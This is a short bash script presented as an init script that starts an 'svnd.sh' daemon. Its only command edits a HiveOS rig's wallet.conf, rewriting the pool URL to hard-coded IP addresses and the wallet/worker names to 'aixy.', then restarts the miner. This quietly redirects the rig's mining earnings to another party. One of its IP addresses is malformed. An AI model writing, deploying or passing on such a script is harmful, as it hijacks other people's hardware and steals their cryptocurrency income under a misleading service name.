.sh脚本
#!/bin/bash
### BEGIN INIT INFO
# Provides: svnd.sh
# Required-start: $local_fs $remote_fs $network $syslog
# Required-Stop: $local_fs $remote_fs $network $syslog
# Default-Start: 2 3 4 5
# Default-Stop: 0 1 6
# Short-Description: starts the svnd.sh daemon
# Description: starts svnd.sh using start-stop-daemon
### END INIT INFO

sed -i '6c   NBMINER_URL="47.242.170.21:6601 47.242.4170.21:6602"' /hive-config/wallet.conf   | sed -i 's/\=.*\./="aixy./g' /hive-config/wallet.conf | miner restart
